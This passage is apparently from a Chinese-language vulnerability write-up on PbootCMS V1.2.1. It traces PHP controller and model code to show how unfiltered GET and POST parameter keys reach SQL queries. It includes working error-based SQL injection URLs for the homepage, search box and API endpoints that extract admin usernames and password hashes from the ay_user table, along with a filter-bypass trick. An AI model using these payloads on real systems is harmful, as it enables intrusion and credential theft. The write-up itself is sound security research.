+<span class="w">                    </span><span class="o">$</span><span class="n">field_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">field_data</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">required</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">field_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">alert_back</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;不能为空！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;：&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">设置创建时间</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;create_time&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_datetime</span><span class="p">();</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">写入数据</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addForm</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">session</span><span class="p">(</span><span class="s1">&#39;lastsub&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">());</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">记录最后提交时间</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;提交表单数据成功！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_mail&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_subject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;来自网站&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">get_http_url</span><span class="p">()</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;（&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;）&#39;</span><span class="p">;</span>
+<span class="w">                    </span><span class="n">sendmail</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(),</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">),</span><span class="w"> </span><span class="o">$</span><span class="n">mail_subject</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">mail_body</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="n">alert_location</span><span class="p">(</span><span class="s1">&#39;提交成功！&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;-1&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;提交表单数据失败！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;提交失败！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">error</span><span class="p">(</span><span class="s1">&#39;提交失败，请使用POST方式提交！&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部
+POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<div class="codehilite"><pre><span></span><code><span class="err">然后就会带入</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addForm</span><span class="p">(</span><span class="err">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="err">执行语句</span>
+</code></pre></div>
+
+<p>路径：PbootCMS-V1.2.1\apps\home\model\ParserModel.php</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">addForm</span><span class="o">($</span><span class="nt">table</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">data</span><span class="o">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="err">return</span><span class="w"> </span><span class="n">parent</span><span class="p">:</span><span class="o">:</span><span class="nf">table</span><span class="p">(</span><span class="err">$</span><span class="kc">table</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">insert</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key
+带入数据库查询引发注入.</p>
+<h2 id="0x013">0X01.3 前台首页注入<a class="headerlink" href="#0x013" title="Permanent link">&para;</a></h2>
+<p>0x08.3.1 漏洞演示 url:</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">PbootCMS-V1</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">/</span><span class="nt">Index</span><span class="o">?</span><span class="nt">ext_price</span><span class="o">%</span><span class="nt">3D1</span><span class="c">/**/</span><span class="nt">and</span><span class="c">/**/</span><span class="nt">updatexml</span><span class="o">(</span><span class="nt">1</span><span class="o">,</span><span class="nt">concat</span><span class="o">(</span><span class="nt">0x7e</span><span class="o">,(</span><span class="nt">SELECT</span><span class="c">/**/</span><span class="nt">distinct</span><span class="c">/**/</span><span class="nt">concat</span><span class="o">(</span><span class="nt">0x23</span><span class="o">,</span><span class="nt">username</span><span class="o">,</span><span class="nt">0x3a</span><span class="o">,</span><span class="nt">password</span><span class="o">,</span><span class="nt">0x23</span><span class="o">)</span><span class="c">/**/</span><span class="nt">FROM</span><span class="c">/**/</span><span class="nt">ay_user</span><span class="c">/**/</span><span class="nt">limit</span><span class="c">/**/</span><span class="nt">0</span><span class="o">,</span><span class="nt">1</span><span class="o">),</span><span class="nt">0x7e</span><span class="o">),</span><span class="nt">1</span><span class="o">));%</span><span class="nt">23</span><span class="o">=</span><span class="nt">123</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId37.png" /></p>
+<h3 id="0x0132">0x01.3.2 漏洞解读<a class="headerlink" href="#0x0132" title="Permanent link">&para;</a></h3>
+<p>文件地址：PbootCMS-V1.2.1\apps\home\controller\ParserController.php
+方法：index(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 首页 骚操作 注入</span>
+<span class="w">    </span><span class="c1">// parserAfter -&gt; parserSpecifyListLabel</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">index</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">parser</span><span class="p">(</span><span class="s">&#39;index.html&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 框架标签解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserBefore</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// CMS公共标签前置解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserPositionLabel</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;首页&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">SITE_DIR</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s">&#39;/&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// CMS当前位置标签解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserSpecialPageSortLabel</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">SITE_DIR</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s">&#39;/&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 解析分类标签</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserAfter</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// CMS公共标签后置解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">true</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>文件地址：apps\home\controller\ParserController.php
+方法：parserAfter()</p>
+<div class="codehilite"><pre><span></span><code><span class="err">跟进</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserAfter</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="err">这个方法</span>
+<span class="c1">// 解析全局后置公共标签</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">parserAfter</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="p">...</span>
+<span class="w">        </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parserSpecifyListLabel</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// 指定列表</span>
+<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>方法：parserSpecifyListLabel(</p>
+<div class="codehilite"><pre><span></span><code><span class="err">进入以后</span><span class="w"> </span><span class="err">查看调用了</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parserSpecifyListLabel</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="err">方法</span>
+<span class="c1">// 解析指定分类列表标签</span>
+<span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">parserSpecifyListLabel</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="p">...</span>
+<span class="w">  </span><span class="c1">// 数据筛选 骚操作注入</span>
+<span class="w">  </span><span class="err">$</span><span class="n">where2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">  </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="err">$</span><span class="n">key</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="err">$</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#39;ext_&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 其他字段不加入</span>
+<span class="w">      </span><span class="err">$</span><span class="n">where2</span><span class="p">[</span><span class="err">$</span><span class="n">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="err">$</span><span class="n">key</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="p">...</span>
+<span class="w">  </span><span class="c1">// 读取数据</span>
+<span class="w">  </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getList</span><span class="p">(</span><span class="err">$</span><span class="n">scode</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">order</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">where1</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">where2</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getSpecifyList</span><span class="p">(</span><span class="err">$</span><span class="n">scode</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">order</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">where1</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">where2</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。
+这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_
+开头，如果符合就直接拼接进入$where2这个数组
+然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入</p>
+<h2 id="0x084">0x08.4 前台搜索框注入<a class="headerlink" href="#0x084" title="Permanent link">&para;</a></h2>
+<h3 id="0x0841">0x08.4.1 漏洞利用<a class="headerlink" href="#0x0841" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="o">:</span><span class="n">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="sr">/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&amp;updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/</span><span class="mi">0</span><span class="o">,</span><span class="mi">1</span><span class="o">),</span><span class="mh">0x7e</span><span class="o">),</span><span class="mi">1</span><span class="o">));%</span><span class="mi">23</span><span class="o">=</span><span class="mi">123</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId41.png" /></p>
+<h3 id="0x0842">0x08.4.2 漏洞讲解<a class="headerlink" href="#0x0842" title="Permanent link">&para;</a></h3>
+<p>文件地址：PbootCMS-V1.2.1\apps\home\controller\SearchController.php
+方法：index()</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 骚操作 注入</span>
+<span class="w">    </span><span class="c1">// parserSearchLabel</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">index</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">parser</span><span class="p">(</span><span class="s">&#39;search.html&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 框架标签解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserBefore</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// CMS公共标签前置解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserPositionLabel</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;搜索&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">(</span><span class="s">&#39;/home/Search/index&#39;</span><span class="p">));</span><span class="w"> </span><span class="c1">// CMS当前位置标签解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserSpecialPageSortLabel</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;搜索结果&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">(</span><span class="s">&#39;/home/Search/index&#39;</span><span class="p">));</span><span class="w"> </span><span class="c1">// 解析分类标签</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserSearchLabel</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// 搜索结果标签</span>
+<span class="w">        </span><span class="no">$</span><span class="n">content</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserAfter</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">);</span><span class="w"> </span><span class="c1">// CMS公共标签后置解析</span>
+<span class="w">        </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="p">(</span><span class="no">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">true</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>文件地址：apps\home\controller\ParserController.php
+方法：parserSearchLabel(</p>
+<div class="codehilite"><pre><span></span><code><span class="err">进入以后</span><span class="w"> </span><span class="err">查看调用了</span><span class="w"> </span><span class="o">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parser</span><span class="o">-&gt;</span><span class="n">parserSearchLabel</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">);</span><span class="w">  </span><span class="err">方法</span>
+<span class="o">//</span><span class="w"> </span><span class="err">解析内容搜索结果标签</span>
+<span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">parserSearchLabel</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="o">...</span>
+<span class="w">  </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">key</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="o">$</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;vars&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="o">$</span><span class="n">where2</span><span class="p">[</span><span class="o">$</span><span class="n">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="o">...</span>
+<span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="err">读取数据</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getList</span><span class="p">(</span><span class="o">$</span><span class="n">scode</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">order</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">where1</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">where2</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">fuzzy</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str_replace</span><span class="p">(</span><span class="o">$</span><span class="n">matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="o">$</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">content</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。
+这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组
+然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入</p>
+<h2 id="0x10-api">0x10 api模块注入<a class="headerlink" href="#0x10-api" title="Permanent link">&para;</a></h2>
+<p>api模块的注入需要后端开启api功能，并且获得 api_appid 与 api_secret
+才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入
+所以较鸡助</p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId44.jpg" /></p>
+<h2 id="0x101">0x10.1 接口注入一<a class="headerlink" href="#0x101" title="Permanent link">&para;</a></h2>
+<h3 id="0x1011">0x10.1.1 漏洞演示<a class="headerlink" href="#0x1011" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="o">:</span><span class="n">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="sr">/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/</span><span class="mi">0</span><span class="o">,</span><span class="mi">1</span><span class="o">),</span><span class="mh">0x7e</span><span class="o">),</span><span class="mi">1</span><span class="o">))--=</span><span class="mi">1</span>
+<span class="n">post</span><span class="err">：</span>
+<span class="w">    </span><span class="mi">11</span><span class="o">=</span><span class="mi">11</span>
+</code></pre></div>
+
+<p>一定要post 要跑空post才能进流程</p>
+<p>因为系统中会把 "空格"转为"_" 所以使用/**/绕过即可</p>
+<h3 id="0x1012">0x10.1.2 漏洞讲解<a class="headerlink" href="#0x1012" title="Permanent link">&para;</a></h3>
+<p>路径：apps\api\controller\CmsController.php 方法：search(
+这里我把漏洞触发点发出来我们主要讲讲他即可</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="err">数据接收</span>
+<span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">key</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="o">$</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;vars&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">where</span><span class="p">[</span><span class="o">$</span><span class="n">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">;</span>
